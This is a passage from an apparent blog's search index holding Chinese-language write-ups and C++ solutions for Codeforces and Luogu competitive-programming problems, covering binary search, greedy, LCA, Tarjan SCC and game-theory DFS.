h[k]-h[j])/(s[k] - s[j]);}int main(){ cin &gt;&gt; n &gt;&gt; L; for(int i = 1;i&lt;=n;i++){ cin &gt;&gt; a[i]; sum[i] = sum[i-1] + a[i]; s[i] = sum[i] + i; h[i] = (s[i]+L+1) * (s[i]+L+1); } h[0] = (L+1) * (L+1); int head = 0,tail = 0; for(int i = 1;i&lt;=n;i++){ while(head &lt; tail &amp;&amp; cal(que[head],que[head+1]) &lt;= 2*s[i]){ head++; } dp[i] = dp[que[head]] + (s[i]-s[que[head]]-L-1)*(s[i]-s[que[head]]-L-1); while(head &lt; tail &amp;&amp; cal(que[tail],i) &lt; cal(que[tail-1],que[tail])){ tail--; } que[++tail] = i; } cout &lt;&lt; dp[n] &lt;&lt; endl;}","tags":["题解","oi","dp"],"categories":["OI"]},{"title":"Codeforces Global Round 2","path":"/2019/4/7/Codeforces-1119/","content":"人生第一次rated的CF比赛，难度Div2到Div1都有，题比较多，像我这种蒟蒻就只能做前五道题了…… 感觉做前面的题的时候要相信直觉，不要想太多（时间只有两小时） A. Ilya and a Colorful Walk 签到题，直接两边各自往中间走就对了 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int MAXN = 3e5+10;int c[MAXN];int main(){\tint n;\tcin &gt;&gt; n;\tfor(int i = 1;i &lt;= n;i++){ cin &gt;&gt; c[i];\t}\tint l = 1,r = n;\twhile(c[l] == c[r]){ l++;\t}\tint ans1 = r-l;\tl = 1,r = n;\twhile(c[l] == c[r]){ r--;\t}\tcout &lt;&lt; max(r-l,ans1) &lt;&lt; endl;} B. Alyona and a Narrow Fridge 明显二分，判断时先排序然后两两配对，奇数个让最小的一个单出来更优。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int MAXN = 1e3+10;typedef long long int64;int64 a[MAXN];int64 tmp[MAXN];int64 n,h;bool check(int64 x){\tif(x == 0 || x &gt; n){ return false;\t}\tmemcpy(tmp,a,sizeof a);\tsort(tmp+1,tmp+x+1);\tint64 ans = 0;\tfor(int i = x;i&gt;=2;i-=2){ ans += max(tmp[i],tmp[i-1]);\t}\tif(x &amp; 1){ ans += tmp[1];\t}\treturn ans &lt;= h;}int main(){\tcin &gt;&gt; n &gt;&gt; h;\tfor(int i = 1;i&lt;=n;i++){ cin &gt;&gt; a[i];\t}\tint64 l = 0,r = n+1;\twhile(l &lt; r){ int64 mid = (l+r+1) &gt;&gt; 1; if(check(mid)){ l = mid; }else{ r = mid-1; }\t}\tcout &lt;&lt; l &lt;&lt; endl;} 注意开int64。 C. Ramesses and Corner Inversion 容易想到两个矩阵先取一个异或，再怎么判断奇偶性。 观察发现异或后每行上一定有偶数个，每列上也有偶数个，并且似乎这就是充要条件了，赛场上没有找到反例。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int MAXN = 510;int a[MAXN][MAXN];int b[MAXN][MAXN];int d[MAXN][MAXN];int n,m;int main(){\tcin &gt;&gt; n &gt;&gt; m;\tfor(int i = 1;i&lt;=n;i++){ for(int j = 1;j&lt;=m;j++){ cin &gt;&gt; a[i][j]; }\t}\tint cnt1 = 0;\tfor(int i = 1;i&lt;=n;i++){ for(int j = 1;j&lt;=m;j++){ cin &gt;&gt; b[i][j]; d[i][j] = a[i][j]^b[i][j]; cnt1 += d[i][j]; }\t}//\tif(cnt1 % 4 != 0){// cout &lt;&lt; \"No\" &lt;&lt; endl;// return 0;//\t}else{ for(int i = 1;i&lt;=n;i++){ int cntnow = 0; for(int j = 1;j&lt;=m;j++){ cntnow += d[i][j]; } if(cntnow &amp; 1){ cout &lt;&lt; \"No\" &lt;&lt; endl; return 0; } } for(int j = 1;j&lt;=m;j++){ int cntnow = 0; for(int i = 1;i&lt;=n;i++){ cntnow += d[i][j]; } if(cntnow &amp; 1){ cout &lt;&lt; \"No\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"Yes\" &lt;&lt; endl;//\t}} D. Frets On Fire 生词太多，花了好久才读懂题意…… 复杂度明显qlogn 详细解释：咕咕咕，看代码吧。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int64 MAXN = 1e5+10;const int64 INF = 0x3f3f3f3f3f3f3f3fll;int64 s[MAXN],d[MAXN],sum[MAXN];int main(){\tint n;\tcin &gt;&gt; n;\tfor(int i = 1;i&lt;=n;i++){ cin &gt;&gt; s[i];\t}\tsort(s+1,s+n+1);\tfor(int i = 2;i&lt;=n;i++){ d[i-1] = s[i] - s[i-1];\t}\tsort(d+1,d+n);\tfor(int i = 1;i&lt;n;i++){ sum[i] = sum[i-1] + d[i];\t}\td[0] = INF;\tint q;\tcin &gt;&gt; q;\tfor(int i = 1;i&lt;=q;i++){ int64 L,R; cin &gt;&gt; L &gt;&gt; R; int64 x = R-L+1; int l = 0,r = n-1; while(l &lt; r){ int mid = (l+r+1) &gt;&gt; 1; if(d[mid] &lt; x){ l = mid; }else{ r = mid-1; } } cout &lt;&lt; n*x - l*x + sum[l] &lt;&lt; ' ';\t}\tcout &lt;&lt; endl;} E. Pavel and Triangles 显然，成立的情况要么一短两长，要么等边三角形。于是考虑贪心，应该先保证一短两长的情况再剩下的里面找等边，才能保证剩下的1,2最少；如果像我一开始的做法就可能剩下大量未匹配到2的1，不够优秀。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 3e5+10;int64 a[MAXN];int main(){\tint n;\tcin &gt;&gt; n;\tfor(int i = 1;i&lt;=n;i++){ cin &gt;&gt; a[i];\t}\tint64 ans = a[1]/3,res = a[1]%3;\tfor(int i = 2;i&lt;=n;i++){ if(res &lt;= a[i]/2){ ans += res; a[i] -= res*2; ans += a[i] / 3; res = a[i] % 3; }else{ ans += a[i]/2; res -= a[i]/2; res += a[i]%2; }\t}//\tfor(int i = 1;i&lt;=n;i++){// ans += a[i]/3;// a[i] %= 3;//\t}//\tint64 cnt1 = 0,cnt2 = 0;//\tfor(int i = 1;i&lt;=n;i++){// if(a[i] == 1){// cnt1++;// }else if(a[i] == 2){// if(cnt1 &gt;= 1){// cnt1--;// ans++;// }else{// cnt2++;// }// }//\t}//\tans += (cnt2 / 3) * 2;//\tif(cnt2 % 3 == 2){// ans++;//\t}\tcout &lt;&lt; ans &lt;&lt; endl;} 后面的图论和DP就不在我的能力范围之内了，看来我还是只会二分贪心……","tags":["题解","oi"],"categories":["OI"]},{"title":"CF733E Sleep in Class [思维题]","path":"/2019/3/30/Codeforces-733E/","content":"https://www.luogu.org/problemnew/show/CF733Ehttps://www.luogu.org/problemnew/show/CF733E 题意 一个人站在楼梯上，楼梯编号1到n，每一层楼梯上面都有着标识，’U’代表这个人上楼，’D’代表这个人下楼，每当这个人离开这一层楼梯，这层楼梯的标识改变，U变成D，D变成U。 现在的问题是，询问出这个人站在1到N的每一层楼梯，那么在每一层楼梯，他要花费多少时间才能走出这些楼（从1或者N走出去），如果他永远走不出去，输出-1 分析 12345678910UUD UUD UUD^ ^ ^DUD UDD UUU ^ ^ ^DDD UDU UDU ^ ^ ^DDU UUU ^ ^DUU ...^ 手工模拟几次样例之后容易发现人会一直沿着一段连续相同的标记往前走，遇到第一个不同的标记就返回后一直往回走，再碰到一个不一样的标记后继续向开始的方向走，回到刚才的折返点时不同的标记已经被清除掉了，就可以继续向前走了…… 相当于这个人从出发点开始，以 的代价依次消除两侧颜色不一样的点，最后获得一条连续的颜色相同的路走出去，不存在走不出去的情况。 12345DUDUDDDUU |-^ |--| |----| |------&gt; 再模拟几次又发现如果出发点方向的折返点（D方向的U，U方向的D）数量大于出发点的反方向的折返点数量，就会从出发点的反方向走出来，否则就从出发点方向走出来好绕啊，再概括一下就是左U（包括自己）大于右D就从右边出去，否则从左边出去。 答案就是D方向的U，U方向的D的距离之和乘二加上最后走出去的花费。 用前缀和统计D和U的数量来判定每个点走出去的方向，然后正方向反方向各开一个队列（里面存当前点需要的的折返点位置）来差分统计当前方向的折返点的距离之和，统计时利用另一个方向的折返点计数保证队列中元素个数正确。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 1e6+10;const int INF = 0x3f3f3f3f;char a[MAXN];int64 ans[MAXN];int sumu[MAXN],sumd[MAXN];int q[MAXN];int main(){\tint n;\tcin &gt;&gt; n &gt;&gt; (a+1);\tfor(int i = 1;i&lt;=n;i++){ sumu[i] = sumu[i-1]; if(a[i] == 'U'){ sumu[i]++; }\t}\tfor(int i = n;i&gt;=1;i--){ sumd[i] = sumd[i+1]; if(a[i] == 'D'){ sumd[i]++; }\t}\tfor(int i = 1;i&lt;=n;i++){ if(sumd[i+1] &gt;= sumu[i]){ ans[i] = i; }else{ ans[i] = n-i+1; }\t}\tint head = 0,tail = 0;\tint64 tot = 0;\tfor(int i = 1;i&lt;=n;i++){ tot += head-tail; //向前推进一格，距离当前队列中折返点距离之和增加为折返点个数 while(head-tail &gt; sumd[i]){ tot -= i - q[tail++];\t//出队多余折返点 } ans[i] += tot*2; if(a[i] == 'U'){ q[head++] = i; }\t}\thead = 0,tail = 0;\ttot = 0;\tfor(int i = n;i&gt;=1;i--){ tot += head-tail; while(head-tail &gt; sumu[i]){ tot += i - q[tail++];\t//出队多余折返点 } ans[i] += tot*2; if(a[i] == 'D'){ q[head++] = i; }\t}\tfor(int i = 1;i&lt;=n;i++){ cout &lt;&lt; ans[i] &lt;&lt; ' ';\t}\tcout &lt;&lt; endl;} 本代码在差分统计答案上参考了Toooooocold的代码实现（自己没想到直接加元素个数这一点，写的太复杂了）。","tags":["题解","oi","思维题"],"categories":["OI"]},{"title":"CF786A Berzerk","path":"/2019/3/29/Codeforces-786A/","content":"https://www.luogu.org/problemnew/show/CF786Ahttps://www.luogu.org/problemnew/show/CF786A 切着切着搜索水题就做到它了。鉴于我还没有正式的学过博弈论，就写篇题解纪念一下吧。 题意 有一个物品放在n个排成一圈的点上，初始放在第2到n号点，甲乙各有一个数集，每次操作时可以将这个物品向后移动s格(s是集合中的数)，判断物品位于每个起始位置时，二人的胜负情况。 分析 结论：能转移到必败态的状态就是必胜态，只能转移到必胜态的状态就是必败态。（思考一下） 因此就可以从1号点开始倒着dfs，记得判平局(从1号点出发不能到达的就是平局) 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;using namespace std;const int MAXN = 7010;const int INF = 0x3f3f3f3f;vector&lt;int&gt; s[2];bool ans[MAXN][2];bool vis[MAXN][2];int cnt[MAXN][2];\t//统计当前状态可以到达的必胜态的数量int n;void dfs(int pos,int player){\tif(vis[pos][player]){ return;\t}\tclog &lt;&lt; pos &lt;&lt; ' ' &lt;&lt; player &lt;&lt; endl;\tvis[pos][player] = true;\tint last = 1-player;\tfor(int i = 0;i&lt;s[last].size();i++){ int v = (pos - s[last][i] + n - 1)%n + 1; if(v == 1){ continue; } if(ans[pos][player]){ cnt[v][last]++; if(cnt[v][last] == s[last].size()){ ans[v][last] = false; dfs(v,last); } }else{ ans[v][last] = true; dfs(v,last); }\t}}int main(){\tcin &gt;&gt; n;\tint k0;\tcin &gt;&gt; k0;\tfor(int i = 1;i&lt;=k0;i++){ int x; cin &gt;&gt; x; s[0].push_back(x);\t}\tint k1;\tcin &gt;&gt; k1;\tfor(int i = 1;i&lt;=k1;i++){ int x; cin &gt;&gt; x; s[1].push_back(x);\t}\tdfs(1,0);\tdfs(1,1);\tfor(int i = 2;i&lt;=n;i++){ if(vis[i][0]){ if(ans[i][0]){ cout &lt;&lt; \"Win \"; }else{ cout &lt;&lt; \"Lose \"; } }else{ cout &lt;&lt; \"Loop \"; }\t}\tcout &lt;&lt; endl;\tfor(int i = 2;i&lt;=n;i++){ if(vis[i][1]){ if(ans[i][1]){ cout &lt;&lt; \"Win \"; }else{ cout &lt;&lt; \"Lose \"; } }else{ cout &lt;&lt; \"Loop \"; }\t}\tcout &lt;&lt; endl;}","tags":["题解","oi","博弈论"],"categories":["OI"]},{"title":"CF95B Lucky Numbers [毒瘤分类讨论贪心/DFS]","path":"/2019/3/19/Codeforces-95B/","content":"https://www.luogu.org/problemnew/show/CF95Bhttps://www.luogu.org/problemnew/show/CF95B 其实代码用不着这么多goto，不过写着方便~ 详细分析有时间再写吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int MAXN = 1e5+10;char a[MAXN],ans[MAXN];int n;int main(){\tcin &gt;&gt; (a+1);\tint n = strlen(a+1);\tif(n &amp; 1){ODD_N: for(int i = 1;i&lt;=n/2 + 1;i++){ putchar('4'); } for(int i = 1;i&lt;=n/2 + 1;i++){ putchar('7'); } putchar(' ');\t}else{ int lead4 = 0,lead7 = 0,now = 1; while(now &lt;= n){ if(a[now] &lt; '4'){ break; }else if(a[now] == '4' &amp;&amp; lead4 &lt; n/2){ ans[now] = '4'; lead4++; now++; }else if(a[now] &lt; '7' &amp;&amp; lead7 &lt; n/2){ ans[now] = '7'; lead7++; break; }else if(a[now] == '7' &amp;&amp; lead7 &lt; n/2){ ans[now] = '7'; lead7++; now++; }else{ goto TRY_LAST_USE_7; } } if(false){TRY_LAST_USE_7: while(--now){ if(ans[now] == '4'){ lead4--; }else{ lead7--; } if(ans[now] &lt; '7' &amp;&amp; lead7 &lt; n/2){ ans[now] = '7'; lead7++; goto OUTPUT; } } goto ODD_N; }OUTPUT: for(int i = 1;i&lt;=lead4 + lead7;i++){ putchar(ans[i]); } for(int i = 1;i&lt;=n/2 - lead4;i++){ putchar('4'); } for(int i = 1;i&lt;=n/2 - lead7;i++){ putchar('7'); } putchar(' ');\t}}","tags":["题解","oi","贪心","思维题"],"categories":["OI"]},{"title":"CF696A Lorenzo Von Matterhorn","path":"/2019/3/15/Codeforces-696A/","content":"https://www.luogu.org/problemnew/show/CF696Ahttps://www.luogu.org/problemnew/show/CF696A 我打赌这道题如果n=1e5，绝对八成的人都会打树剖 然而n高达1e18，所以建图是不可能的了。注意观察q只有1000，就是说只会涉及最多2000个点，因此就可以离散化+LCA瞎搞。然而这是一颗满二叉树，所以不用建图，直接开一个map&lt;int64,int64&gt;表示每个节点到父亲的距离，按照LCA的求法边跳边更新答案就是了。 2000个点，最多处理2000*64次边，爆不了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;map&gt;using namespace std;typedef long long int64;const int MAXN = 500010;const int INF = 0x3f3f3f3f;map&lt;int64,int64&gt; dis;int main(){\tint q;\tcin &gt;&gt; q;\tfor(int i = 1;i&lt;=q;i++){ int64 opr,a,b; cin &gt;&gt; opr &gt;&gt; a &gt;&gt; b; if(opr == 1){ int64 w; cin &gt;&gt; w; while(a != b){ if(a &lt; b){ swap(a,b); } dis[a] += w; a &gt;&gt;= 1; } }else{ int64 ans = 0; while(a != b){ if(a &lt; b){ swap(a,b); } ans += dis[a]; a &gt;&gt;= 1; } cout &lt;&lt; ans &lt;&lt; endl; }\t}}","tags":["题解","oi","思维题"],"categories":["OI"]},{"title":"CF832D Misha, Grisha and Underground","path":"/2019/3/15/Codeforces-832D/","content":"https://www.luogu.org/problemnew/show/CF832Dhttps://www.luogu.org/problemnew/show/CF832D 简单LCA求距离，令a为汇合点，那么答案就是(dis(a,b) + dis(a,c) - dis(b,c)) / 2 + 1，dis用lca求出，枚举a就好。 当然也可以一一讨论abc的位置关系，不过容易出错。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int MAXN = 100010;const int INF = 0x3f3f3f3f;class LFS { public: LFS() { memset(head, -1, sizeof head); ecnt = 0; n = 0; } LFS(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { e[ecnt].to = to; e[ecnt].w = w; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } protected: struct Edge { int to, next, w; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; private: virtual void dfs(int u, int fa) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { dfs(v, u); } } }};class LCA : public LFS{ public: int dep[MAXN]; LCA(int n) : LFS(n) { memset(dep, -1, sizeof dep); } void pre(int rt = 1) { dfs(rt, 1, 0); } int querylca(int a, int b) { if (dep[a] &gt; dep[b]) swap(a, b); int h = dep[b] - dep[a]; for (int i = 20; i &gt;= 0; i--) { if(h &amp; (1 &lt;&lt; i)) { b = f[b][i]; } } if (a == b) return a; for (int i = 20; i &gt;= 0; i--) { if (f[a][i] == f[b][i]) continue; a = f[a][i]; b = f[b][i]; } return f[a][0]; } int querydis(int a,int b){ int lca = querylca(a,b); return dep[a] + dep[b] - dep[lca]*2; } protected: int f[MAXN][22]; private: void dfs(int u, int d, int fa) { dep[u] = d; f[u][0] = fa; for (int i = 1; i &lt; 21; i++) { f[u][i] = f[f[u][i - 1]][i - 1]; } for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dep[v] == -1) { dfs(v, d + 1, u); } } }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int solve(LCA* tree,int a,int b,int c){\tint disab = tree-&gt;querydis(a,b);\tint disac = tree-&gt;querydis(a,c);\tint disbc = tree-&gt;querydis(b,c);\treturn (disab + disac - disbc) / 2 + 1;}int main(){\tint n,q;\tcin &gt;&gt; n &gt;&gt; q;\tLCA* tree = new LCA(n);\tfor(int i = 2;i&lt;=n;i++){ int a; cin &gt;&gt; a; tree-&gt;addde(i,a,1);\t}\ttree-&gt;pre();\tfor(int i = 1;i&lt;=q;i++){ int a,b,c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; int ans = 0; ans = max(solve(tree,a,b,c),max(solve(tree,b,a,c),solve(tree,c,a,b))); cout &lt;&lt; ans &lt;&lt; endl;\t}}","tags":["题解","oi","lca"],"categories":["OI"]},{"title":"CF932D Tree","path":"/2019/3/15/Codeforces-932D/","content":"https://www.luogu.org/problemnew/show/CF932Dhttps://www.luogu.org/problemnew/show/CF932D 题意 一棵树开始只有一个1号点，权值为0，两种操作： 1 R W 在R号点下面加一个cnt+1号点 2 R X 从R号点开始向祖先走，依次选择R的祖先，要求权值依次增大，且已选择的点权值之和小于X，输出最多能选几个点 强制在线 题解 观察发现只要记录当前已选点序列中的最远点，就可以倍增合并两段的点权之和，回答时与X比较即可 由于新的点只会是叶节点，就可以在加点时倍增预处理出该点向上选取1&lt;&lt;i个合法点时的最远点和此时的点权之和。详见代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 500010;const int64 INF = 0x3f3f3f3f3f3f3f3fll;int fa[MAXN][22];\t//向上跳1&lt;&lt;i个权值大于u的点的编号，忽视权值小于u的点int64 w[MAXN];int64 sum[MAXN][22];\t//到第1&lt;&lt;i个满足要求的祖先的和void adde(int u,int v){\tif(w[u] &gt;= w[v]){ fa[v][0] = u;\t}else{ for(int i = 20;i&gt;=0;i--){ if(w[fa[u][i]] &lt; w[v]){ u = fa[u][i]; } fa[v][0] = fa[u][0]; }\t}\tsum[v][0] = w[fa[v][0]];\tfor(int i = 1;i&lt;=20;i++){ fa[v][i] = fa[fa[v][i-1]][i-1]; if(fa[v][i] != 0){\t//防爆int64 sum[v][i] = sum[v][i-1] + sum[fa[v][i-1]][i-1]; }else{ sum[v][i] = INF; }\t}}int query(int r,int64 x){\tif(w[r] &gt; x){ return 0;\t}\tx -= w[r];\tint now = r,ans = 1;\tfor(int i = 20;i&gt;=0;i--){ if(x - sum[now][i] &gt;= 0){ x -= sum[now][i]; ans += 1&lt;&lt;i; now = fa[now][i]; }\t}\treturn ans;}#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int64 read() { int64 X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}template&lt;typename T&gt;inline void write(T x) { if (x &lt; 0) putchar('-'), x = -x; if (x &gt; 9) write(x / 10); putchar(x % 10 + '0');}int main(){\tw[0] = INF;\t//边界条件\tmemset(sum[1],INF,sizeof sum[1]);\tint64 last = 0;\tint q,cnt = 1;\tcin &gt;&gt; q;\tfor(int i = 1;i&lt;=q;i++){ int64 opr,a,b; opr = read(); a = read(); b = read(); a ^= last; b ^= last; //clog &lt;&lt; a &lt;&lt; ' ' &lt;&lt; b &lt;&lt; endl; if(opr == 1){ w[++cnt] = b; adde(a,cnt); }else{ last = query(a,b); write(last); putchar(' '); }\t}} 注意INF要开int64，被坑了好久","tags":["题解","oi","lca"],"categories":["OI"]},{"title":"洛谷P2783 有机化学之神偶尔会做作弊（水黑题系列）","path":"/2019/3/12/Luogu-P2783/","content":"https://www.luogu.org/problemnew/show/P2783https://www.luogu.org/problemnew/show/P2783 这个题看上去好像是tarjan缩点后直接LCA判距离，其实也是这样…… 但是一般的tarjan求SCC写法过不了，题目也强调了两个碳不成环，因此可以 先DFS一遍双向边变单向边 或者tarjan里面加一个v!=fa就好 我写的是后一种 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;iomanip&gt;using namespace std;const int MAXN = 10010;const int MAXM = 50010;const int INF = 0x3f3f3f3f;class LFS { public: LFS() { memset(head, -1, sizeof head); ecnt = 0; n = 0; } LFS(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { e[ecnt].to = to; e[ecnt].w = w; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } protected: struct Edge { int to, next, w; } e[MAXM * 2]; int head[MAXN]; int ecnt; int n; private: virtual void dfs(int u, int fa) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { dfs(v, u); } } }};#include &lt;stack&gt;class SCC_Tarjan : public LFS { public: int scccnt; int belong[MAXN];\tSCC_Tarjan(int n) : LFS(n) { memset(dfn, -1, sizeof dfn); memset(low, -1, sizeof low); memset(ins, false, sizeof ins); memset(belong,0,sizeof belong); tim = 1; scccnt = 0; } void solve() { for(int i = 1;i&lt;=n;i++){ if(dfn[i] == -1){ tarjan(i,0); } } }\t//缩点，先调用solve\tvoid createnew(LFS* map){ for(int i = 1;i&lt;=n;i++){ for(int j = head[i];j!=-1;j = e[j].next){ int u = belong[i]; int v = belong[e[j].to]; if(u != v){ map-&gt;adde(u,v,e[j].w); } } }\t} protected: stack&lt;int&gt; s; bool ins[MAXN]; int mina[MAXN]; int low[MAXN], dfn[MAXN]; int tim; void tarjan(int u,int fa) { dfn[u] = low[u] = tim++; s.push(u); ins[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (fa == v){ continue; } if (dfn[v] == -1) { tarjan(v,u); low[u] = min(low[u], low[v]); } else { if (ins[v]) { low[u] = min(low[u], dfn[v]); } } } if (dfn[u] == low[u]) { scccnt++; int v = 0; while (v != u) { v = s.top(); s.pop(); ins[v] = false; belong[v] = scccnt; } } }};class LCA : public LFS{ public: int dep[MAXN]; LCA(int n) : LFS(n) { memset(dep, -1, sizeof dep); } void pre(int rt = 1) { dfs(rt, 1, 0); } int querylca(int a, int b) { if (dep[a] &gt; dep[b]) swap(a, b); int h = dep[b] - dep[a]; for (int i = 20; i &gt;= 0; i--) { if(h &amp; (1 &lt;&lt; i)) { b = f[b][i]; } } if (a == b) return a; for (int i = 20; i &gt;= 0; i--) { if (f[a][i] == f[b][i]) continue; a = f[a][i]; b = f[b][i]; } return f[a][0]; } protected: int f[MAXN][22]; private: void dfs(int u, int d, int fa) { dep[u] = d; f[u][0] = fa; for (int i = 1; i &lt; 21; i++) { f[u][i] = f[f[u][i - 1]][i - 1]; } for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dep[v] == -1) { dfs(v, d + 1, u); } } }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main(){\tint n = read();\tint m = read();\tSCC_Tarjan *all = new SCC_Tarjan(n);\tfor(int i = 1;i&lt;=m;i++){ int u = read(); int v = read(); all-&gt;addde(u,v,1);\t}\tall-&gt;solve();\tLCA* map = new LCA(all-&gt;scccnt);\tall-&gt;createnew(map);\tmap-&gt;pre();\tint tcnt = read();\tfor(int i = 1;i&lt;=tcnt;i++){ int a,b; a = all-&gt;belong[read()]; b = all-&gt;belong[read()]; int lca = map-&gt;querylca(a,b); int ans = map-&gt;dep[a] + map-&gt;dep[b] - map-&gt;dep[lca]*2 + 1; char tmp[64] = {0}; int pos = 0; while (ans){ tmp[pos++] = (((bool)(ans &amp; 1)) + '0'); ans &gt;&gt;= 1; } for(;pos&gt;0;pos--){ putchar(tmp[pos-1]); } putchar(' ');\t}} 别忘了输出二进制","tags":["题解","oi","lca","scc"],"categories":["OI"]},{"title":"洛谷P4427 [BJOI2018]求和","path":"/2019/3/12/Luogu-P4427/","content":"https://www.luogu.org/problemnew/show/P4427https://www.luogu.org/problemnew/show/P4427 好久都没有发过新文章了，水一点题解吧 这道题乍一看好像是数学题，但观察到 ,就可以预处理处每个k对应的树上前缀和，就很好办了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149// luogu-judger-enable-o2#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 300010;const int INF = 0x3f3f3f3f;const int MOD = 998244353;class LFS { public: LFS() { memset(head, -1, sizeof head); ecnt = 0; n = 0; } LFS(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { e[ecnt].to = to; e[ecnt].w = w; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } protected: struct Edge { int to, next, w; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; private: virtual void dfs(int u, int fa) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { dfs(v, u); } } }};int64 pow_mod(int64 a, int64 b) { int64 res = 1; while (b) { if (b &amp; 1) res = res * a % MOD; a = a * a % MOD; b /= 2; } return res;}class LCA : public LFS{ public: int dep[MAXN]; int64 sum[MAXN][51]; LCA(int n) : LFS(n) { memset(dep, -1, sizeof dep); memset(sum,0,sizeof sum); } void pre(int rt = 1) { dfs(rt, 0, 0); } int querylca(int a, int b) { if (dep[a] &gt; dep[b]) swap(a, b); int h = dep[b] - dep[a]; for (int i = 20; i &gt;= 0; i--) { if(h &amp; (1 &lt;&lt; i)) { b = f[b][i]; } } if (a == b) return a; for (int i = 20; i &gt;= 0; i--) { if (f[a][i] == f[b][i]) continue; a = f[a][i]; b = f[b][i]; } return f[a][0]; } //protected: int f[MAXN][22]; private: void dfs(int u, int d, int fa) { dep[u] = d; f[u][0] = fa; for(int i = 1;i&lt;=50;i++){ sum[u][i] = sum[fa][i] + pow_mod(d,i); sum[u][i] %= MOD; } for (int i = 1; i &lt; 21; i++) { f[u][i] = f[f[u][i - 1]][i - 1]; } for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dep[v] == -1) 